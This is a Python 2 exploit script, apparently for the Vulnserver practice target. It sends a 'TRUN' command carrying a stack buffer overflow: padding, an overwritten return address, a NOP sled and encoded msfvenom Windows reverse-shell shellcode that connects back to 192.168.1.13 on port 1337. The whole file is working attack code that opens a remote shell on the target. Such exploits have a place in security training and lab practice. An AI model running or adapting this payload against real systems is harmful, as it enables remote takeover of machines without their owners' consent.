#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.13 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00"
shellcode = ("\xbe\xeb\x5c\x42\x79\xdb\xca\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x01\xa0\xa0\x8c\x29\xb1\xa7"
"\x6f\xd1\x42\xc8\xe6\x34\x73\xc8\x9d\x3d\x24\xf8\xd6\x13\xc9"
"\x73\xba\x87\x5a\xf1\x13\xa8\xeb\xbc\x45\x87\xec\xed\xb6\x86"
"\x6e\xec\xea\x68\x4e\x3f\xff\x69\x97\x22\xf2\x3b\x40\x28\xa1"
"\xab\xe5\x64\x7a\x40\xb5\x69\xfa\xb5\x0e\x8b\x2b\x68\x04\xd2"
"\xeb\x8b\xc9\x6e\xa2\x93\x0e\x4a\x7c\x28\xe4\x20\x7f\xf8\x34"
"\xc8\x2c\xc5\xf8\x3b\x2c\x02\x3e\xa4\x5b\x7a\x3c\x59\x5c\xb9"
"\x3e\x85\xe9\x59\x98\x4e\x49\x85\x18\x82\x0c\x4e\x16\x6f\x5a"
"\x08\x3b\x6e\x8f\x23\x47\xfb\x2e\xe3\xc1\xbf\x14\x27\x89\x64"
"\x34\x7e\x77\xca\x49\x60\xd8\xb3\xef\xeb\xf5\xa0\x9d\xb6\x91"
"\x05\xac\x48\x62\x02\xa7\x3b\x50\x8d\x13\xd3\xd8\x46\xba\x24"
"\x1e\x7d\x7a\xba\xe1\x7e\x7b\x93\x25\x2a\x2b\x8b\x8c\x53\xa0"
"\x4b\x30\x86\x67\x1b\x9e\x79\xc8\xcb\x5e\x2a\xa0\x01\x51\x15"
"\xd0\x2a\xbb\x3e\x7b\xd1\x2c\x81\xd4\xd8\xa1\x69\x27\xda\xbc"
"\x50\xae\x3c\xd4\xb2\xe6\x97\x41\x2a\xa3\x63\xf3\xb3\x79\x0e"
"\x33\x3f\x8e\xef\xfa\xc8\xfb\xe3\x6b\x39\xb6\x59\x3d\x46\x6c"
"\xf5\xa1\xd5\xeb\x05\xaf\xc5\xa3\x52\xf8\x38\xba\x36\x14\x62"
"\x14\x24\xe5\xf2\x5f\xec\x32\xc7\x5e\xed\xb7\x73\x45\xfd\x01"
"\x7b\xc1\xa9\xdd\x2a\x9f\x07\x98\x84\x51\xf1\x72\x7a\x38\x95"
"\x03\xb0\xfb\xe3\x0b\x9d\x8d\x0b\xbd\x48\xc8\x34\x72\x1d\xdc"
"\x4d\x6e\xbd\x23\x84\x2a\xcd\x69\x84\x1b\x46\x34\x5d\x1e\x0b"
"\xc7\x88\x5d\x32\x44\x38\x1e\xc1\x54\x49\x1b\x8d\xd2\xa2\x51"
"\x9e\xb6\xc4\xc6\x9f\x92")     #size = 351
buff = 'A' * 2003 + '\xAF\x11\x50\x62' + '\x90' * 142 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.recv(1024)
s.send("TRUN /.:/" + buff + "\r\n")
s.close()
